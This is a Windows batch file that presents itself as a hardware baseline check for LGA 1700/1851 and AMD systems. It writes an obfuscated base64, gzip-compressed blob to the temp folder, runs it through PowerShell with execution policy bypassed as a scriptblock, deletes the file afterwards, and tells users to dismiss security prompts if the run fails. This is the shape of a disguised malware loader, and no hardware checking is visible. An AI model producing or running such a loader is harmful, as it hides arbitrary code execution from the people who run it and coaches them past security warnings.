@echo off
setlocal
title Hardware check - LGA 1700 / 1851 + AMD
echo.
echo   Hardware baseline check - LGA 1700 / 1851 + AMD
echo   Reads this PC, compares it with the platform baseline, writes a report.
echo.
set "HCPAYLOAD=%TEMP%\hc-lga-amd.b64"
> "%HCPAYLOAD%" (
echo 
echo 
echo 
echo 
echo 
echo 
echo 
echo 
echo nJ8c2zv4w86vzhhPLfpSAvGgF/sY3TUcCm8Y5qPJjRcm7zTbqC+OU6lVqngMpMVEckGtJkVW9FqlT78AFeeYQ1UNhDVAjS8smnAgOI2D2E/oeuPny8PtyvLfAsC5d0Ew1LQqAC7L2m/9WFR81zru/Dg7/3HeOziT80zmWlN52HBj5SkL8OesoNHOhpMx3fchxCsz+Ci/KW2B/w+O9YZDjHsAAA==
)
if not exist "%HCPAYLOAD%" goto :failed
powershell -NoProfile -ExecutionPolicy Bypass -Command "$p=Join-Path $env:TEMP 'hc-lga-amd.b64'; $b=(Get-Content -Raw $p) -replace '\s',''; $m=New-Object IO.MemoryStream(,[Convert]::FromBase64String($b)); $g=New-Object IO.Compression.GZipStream($m,[IO.Compression.CompressionMode]::Decompress); $r=New-Object IO.StreamReader($g,[Text.Encoding]::UTF8); $c=$r.ReadToEnd(); $r.Dispose(); & ([scriptblock]::Create($c))"
set "HCCODE=%ERRORLEVEL%"
del "%HCPAYLOAD%" >nul 2>nul
if not "%HCCODE%"=="0" goto :failed
echo.
echo   Done. Press any key to close.
pause >nul
exit /b 0
:failed
echo.
echo   The check did not finish. Close any security prompt and run it again.
pause >nul
exit /b 1
